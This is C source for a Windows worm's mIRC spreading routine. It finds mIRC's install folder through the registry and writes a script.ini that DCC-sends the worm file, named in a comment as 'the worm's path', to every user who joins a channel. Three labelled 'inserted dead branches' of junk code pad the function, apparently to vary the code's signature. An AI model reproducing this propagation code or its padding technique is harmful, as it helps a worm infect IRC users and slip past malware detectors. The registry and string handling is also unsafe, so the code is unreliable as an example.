#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void _FindmIRC(void)
{
    char mIrc[256];
    char mIrcPath[256];
    char mIrcFull[256] = {0};
    FILE *Script;

    // --- INSERTED DEAD BRANCH 1 (Math Invariant, Category A: System info) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char userName[256];
        DWORD size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            volatile int dummyUse = userName[0];
        }
        char compName[256];
        size = sizeof(compName);
        if (GetComputerNameA(compName, &size)) {
            volatile int dummyUse = compName[0];
        }
        volatile DWORD dummySum = 0;
        for (int i = 0; i < 10; i++) {
            dummySum += si.dwNumberOfProcessors + st.wHour;
        }
        // read existing local variable (just to satisfy reading rule)
        volatile int readLocal = mIrc[0];
        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&st, sizeof(st));
    }

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIrc", 0, KEY_READ, &_hKey);
    RegQueryValueExA(_hKey, "UninstallString", NULL, NULL, mIrc, (LPDWORD)&_mIrcPath);
    RegCloseKey(_hKey);

    // Extract the mIRC installation path from the uninstall string (skip the first character)
    int e = 1;
    while (mIrc[e] != '\0' && mIrc[e] != '.')
    {
        mIrcFull[e - 1] = mIrc[e];
        e++;
    }
    mIrcFull[e - 1] = '\0';   // truncate before the dot (e.g., "C:\...\mirc.exe" -> "C:\...\mirc")

    // Find the last backslash and truncate to the directory
    e = strlen(mIrcFull);
    while (mIrcFull[e] != '\\')
    {
        mIrcFull[e] = '\0';
        e--;
    }

    // --- INSERTED DEAD BRANCH 2 (Combination, Category B: Memory & string) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char* dummyBuf = (char*)malloc(64);
        if (dummyBuf) {
            sprintf_s(dummyBuf, 64, "Dummy %d", (int)dummy_tick_2);
            size_t len = strlen(dummyBuf);
            char* dummyBuf2 = (char*)malloc(len + 10);
            if (dummyBuf2) {
                memcpy(dummyBuf2, dummyBuf, len);
                memset(dummyBuf2 + len, 0, 10);
                volatile int hash = 0;
                for (int i = 0; i < (int)len; i++) {
                    hash = (hash * 31) + dummyBuf2[i];
                }
                // read existing local
                volatile int readLocal2 = mIrcFull[0];
                free(dummyBuf2);
            }
            free(dummyBuf);
        }
        volatile char localBuf[32];
        memset((void*)localBuf, 0, sizeof(localBuf));
    }

    // Append "script.ini"
    strcat(mIrcFull, "script.ini");

    Script = fopen(mIrcFull, "wt");
    fprintf(Script, "[script]\n");
    fprintf(Script, "n0=on 1:JOIN:#:{\n");
    fprintf(Script, "n1=/if ( $nick == $me ) { halt }\n");
    fprintf(Script, "n2=/dcc send $nick %s\n", _sysdoze2);   // use the global sysdoze2 (the worm's path)
    fprintf(Script, "n3=}\n");
    fclose(Script);

    // --- INSERTED DEAD BRANCH 3 (System Query, Category C: Bitwise/Math loops) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile unsigned char dummyArr[32];
        for (int i = 0; i < 32; i++) {
            dummyArr[i] = (unsigned char)(i * 7);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int i = 0; i < 32; i++) {
            hash ^= dummyArr[i];
            hash *= 0x01000193;
        }
        volatile int xorSum = 0;
        for (int i = 0; i < 32; i++) {
            xorSum ^= dummyArr[i];
        }
        // read existing local
        volatile int readLocal3 = mIrcFull[0];
        SecureZeroMemory((void*)dummyArr, sizeof(dummyArr));
        SYSTEM_INFO si2;
        GetSystemInfo(&si2);
        volatile DWORD dummyProc = si2.dwNumberOfProcessors;
    }

    return;
}
